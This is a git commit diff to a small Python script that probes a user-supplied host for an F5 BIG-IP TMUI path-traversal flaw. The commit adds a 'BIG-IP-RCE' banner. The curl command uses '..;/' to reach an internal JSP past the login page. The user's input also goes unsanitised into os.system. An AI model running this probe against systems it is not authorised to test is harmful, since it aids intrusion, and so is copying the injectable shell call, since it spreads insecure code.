a6bac9c980063491be14873cc41bd369ab51360e
united36 <59273001+united36@users.noreply.github.com>
2020-08-27 04:58:01 -0400

    Update big.py

--- big.py
+++ big.py
@@ -4,6 +4,13 @@ import requests
 import urllib3
 import imgkit
 
+print (""" ____ ___ ____      ___ ____       ____   ____ _____ 
+	        | __ )_ _/ ___|    |_ _|  _ \     |  _ \ / ___| ____|
+	        |  _ \| | |  _ _____| || |_) |____| |_) | |   |  _|  
+	        | |_) | | |_| |_____| ||  __/_____|  _ <| |___| |___ 
+	        |____/___\____|    |___|_|        |_| \_\\____|_____|  """)
+print (" ") 
+
 host= input( "Enter the host Domain/IP:")
 cmd = "curl -sk 'https://"+host+"/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=Vulnerable' | grep -q Vulnerable && printf '\033[0;31mVulnerable\n' || printf '\033[0;32mNot Vulnerable\n'"
 a = os.system(cmd)
